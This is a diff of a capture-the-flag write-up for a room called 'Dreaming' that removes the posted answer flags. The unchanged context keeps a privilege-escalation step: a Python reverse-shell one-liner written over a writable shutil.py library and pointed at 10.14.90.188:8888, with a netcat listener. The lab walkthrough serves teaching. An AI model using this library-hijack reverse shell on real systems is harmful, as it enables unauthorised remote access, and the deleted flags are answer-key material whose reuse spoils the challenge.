@@ -1,5 +1,5 @@
 # Dreaming
-(Flags are at the end of the writeup)
+
 ### Recover the Kingdom!
 Initial scan shows port 22 and 80 open: 
 
@@ -65,14 +65,6 @@ Now, if we look inside morpheus' home directory, we can see a .py file that we c
 This file imports the shutil library, to which the death user has write access:<br />
 ![image](https://github.com/user-attachments/assets/f6038e64-7636-411d-b2c9-837bdf15ca66)<br />
 We can then overwite this library with a reverse shell, and open a netcat listener, to check if this backup operation is actually a cronjob. Run `echo "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.90.188",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")" > /usr/lib/python3.8/shutil.py` and then on the attacker's machine `nc -lnvp 8888`, wait a minute and get morpheus flag :) 
-
-
-
-
-
-- What is the Lucien Flag? `THM{TH3_L1BR4R14N}`
-- What is the Death Flag? `THM{1M_TH3R3_4_TH3M}`
-- What is the Morpheus Flag? `THM{DR34MS_5H4P3_TH3_W0RLD}`
 
 
 
